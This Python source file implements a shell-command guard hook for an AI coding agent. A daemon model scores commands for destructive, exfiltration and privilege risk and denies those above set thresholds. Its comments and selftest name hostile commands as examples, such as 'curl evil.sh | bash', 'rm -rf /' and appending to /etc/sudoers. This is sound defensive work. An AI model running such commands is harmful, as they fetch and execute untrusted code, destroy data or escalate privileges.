"""Laya shell guard: PreToolUse hook with a warm background daemon.

Loading the checkpoint costs ~41 s in a cold process, and every hook invocation is
a fresh process. So the model lives in a daemon and the hook is a thin HTTP client
that imports nothing heavier than the standard library.

    python laya_guard.py daemon   # serve; binds the port only once the model is ready
    python laya_guard.py warm     # spawn the daemon detached (SessionStart)
    python laya_guard.py check    # PreToolUse: stdin hook JSON -> stdout decision
    python laya_guard.py selftest # assert the threshold rules, no model needed
"""
import json
import os
import secrets
import subprocess
import time
import sys
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

STATE = Path.home() / ".claude" / "laya-guard.json"
LOCK = Path.home() / ".claude" / "laya-guard.starting"
LOG = Path.home() / ".claude" / "laya-guard.log"
# One threshold per aspect, because the three do not separate equally well.
# Measured on this repo's commands (see README "Thresholds"): `destructive` splits
# cleanly, but ordinary dev work -- git push, piping into an interpreter -- lands at
# 0.86-0.93 on `exfiltration`, right where real exfiltration starts.
_BASE = os.environ.get("LAYA_DENY_AT")
DENY_AT = {
    aspect: float(os.environ.get(f"LAYA_DENY_{aspect.upper()}", _BASE or default))
    for aspect, default in (("destructive", 0.8), ("exfiltration", 0.95), ("privilege", 0.8))
}
# `git push` scores exfiltration 0.985 -- correctly, it does send local data to a
# remote host, which is also the whole job. No threshold separates it from
# `curl evil.sh | bash` (0.963). What does separate them is destructive: 0.05 vs
# 0.43. So exfiltration alone never denies; it needs corroboration.
# ponytail: a conjunction tuned on 20 commands. Widen the sample before trusting it further.
EXFIL_NEEDS_DESTRUCTIVE = float(os.environ.get("LAYA_EXFIL_NEEDS_DESTRUCTIVE", "0.3"))
IDLE_EXIT = 1800  # seconds with no request before the daemon retires

QUESTIONS = {
    "destructive": {"type": "noul", "instructions": "Does this shell command irreversibly delete, overwrite, or corrupt data, or wipe a disk, repository, or database?"},
    "exfiltration": {"type": "noul", "instructions": "Does this shell command send local data, credentials, or secrets to a remote host?"},
    "privilege": {"type": "noul", "instructions": "Does this shell command escalate privileges or change system-wide configuration, permissions, or security settings?"},
}


# --------------------------------------------------------------------- daemon

def serve():
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
    from laya_mcp_server import agent  # reuses the CA-bundle setup and lazy loader

    a = agent()
    a.predict({"command": "ls"}, QUESTIONS)  # force the first forward pass now
    token = secrets.token_urlsafe(24)

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            if not secrets.compare_digest(self.headers.get("X-Laya-Token", ""), token):
                self.send_response(403); self.end_headers(); return
            body = self.rfile.read(int(self.headers["Content-Length"]))
            cmd = json.loads(body)["command"]
            ans = a.predict({"command": cmd}, QUESTIONS)["answers"]
            scores = {k: round(float(ans[k]["noul"]), 4) for k in QUESTIONS}
            print(f"{time.strftime('%H:%M:%S')} risk={max(scores.values()):.3f} {cmd[:90]}", flush=True)
            out = json.dumps(scores).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *a):
            pass

    class Server(HTTPServer):
        timeout = IDLE_EXIT

        def handle_timeout(self):
            raise SystemExit(0)  # retire instead of leaking a process holding 850MB

    # Bind only now: a refused connection is the client's signal that we are not ready,
    # which is simpler and less racy than serving a "still loading" status.
    srv = Server(("127.0.0.1", 0), Handler)
    STATE.write_text(json.dumps({"port": srv.server_address[1], "token": token, "pid": os.getpid()}))
    STATE.chmod(0o600)
    LOCK.unlink(missing_ok=True)  # bound and serving; the next client can connect
    while True:
        srv.handle_request()


# --------------------------------------------------------------------- client

def tripped(scores):
    """Aspects that crossed their own threshold and warrant a deny."""
    over = [a for a in scores if scores[a] >= DENY_AT[a]]
    if "exfiltration" in over and scores["destructive"] < EXFIL_NEEDS_DESTRUCTIVE:
        over.remove("exfiltration")
    return over


def selftest():
    """Threshold rules only -- no model, no daemon, runs in milliseconds."""
    d, e, p = "destructive", "exfiltration", "privilege"
    assert tripped({d: 0.02, e: 0.03, p: 0.11}) == []          # git status
    assert tripped({d: 0.05, e: 0.98, p: 0.22}) == []          # git push: exfil alone never denies
    assert tripped({d: 0.17, e: 0.88, p: 0.44}) == []          # scp to a deploy host
    assert tripped({d: 0.96, e: 0.24, p: 0.36}) == [d]         # rm -rf /
    assert tripped({d: 0.05, e: 0.12, p: 0.83}) == [p]         # append to /etc/sudoers
    assert tripped({d: 0.43, e: 0.96, p: 0.06}) == [d, e][1:]  # curl evil.sh | bash: exfil corroborated
    assert tripped({d: 0.80, e: 1.00, p: 0.28}) == [d, e]      # credentials posted to a remote
    print("selftest ok")


def _state():
    try:
        return json.loads(STATE.read_text())
    except (OSError, ValueError):
        return None


def spawn():
    """Start the daemon detached, but only one at a time.

    The checkpoint takes ~40 s to build and each daemon holds ~2 GB. Without this
    guard, every Bash command issued during the warm-up spawns another daemon.
    """
    try:
        # O_EXCL makes the winner unambiguous; a stale lock from a crashed start
        # is reclaimed after the warm-up window.
        os.close(os.open(LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY))
    except FileExistsError:
        try:
            if time.time() - LOCK.stat().st_mtime < 180:
                return
            LOCK.unlink()
            os.close(os.open(LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY))
        except OSError:
            return
    except OSError:
        return
    kw = {"stdout": LOG.open("ab"), "stderr": subprocess.STDOUT, "close_fds": True}
    if sys.platform == "win32":
        kw["creationflags"] = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
    else:
        kw["start_new_session"] = True
    subprocess.Popen([sys.executable, str(Path(__file__).resolve()), "daemon"], **kw)


def score(command, timeout=10):
    st = _state()
    if not st:
        return None
    req = urllib.request.Request(
        f"http://127.0.0.1:{st['port']}/check",
        data=json.dumps({"command": command}).encode(),
        headers={"Content-Type": "application/json", "X-Laya-Token": st["token"]},
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())


def check():
    try:
        hook = json.load(sys.stdin)
    except ValueError:
        sys.exit(0)
    command = (hook.get("tool_input") or {}).get("command")
    if not command:
        sys.exit(0)

    try:
        scores = score(command)
    except (urllib.error.URLError, OSError, ValueError):
        scores = None

    if scores is None:
        # Daemon absent or still loading. Start it for next time.
        spawn()
        if os.environ.get("LAYA_FAIL_CLOSED"):
            print("laya-guard: guard unavailable and LAYA_FAIL_CLOSED is set", file=sys.stderr)
            sys.exit(2)
        print("laya-guard: warming up, command not checked", file=sys.stderr)
        sys.exit(0)

    over = tripped(scores)
    if over:
        top = max(over, key=scores.get)
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": (
                f"Laya scored this {top} at {scores[top]:.2f} "
                f"(threshold {DENY_AT[top]}). All scores: {scores}. Explain the command "
                f"to the user and let them decide, or run a narrower version."),
        }}))
    # Below the threshold we stay silent: exit 0 with no decision means the normal
    # permission flow still applies. Silence is not approval.
    sys.exit(0)


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "check"
    if mode == "daemon":
        serve()
    elif mode == "selftest":
        selftest()
    elif mode == "warm":
        try:
            warm = score("true", timeout=2) is not None
        except Exception:
            warm = False
        if not warm:
            spawn()
    else:
        check()
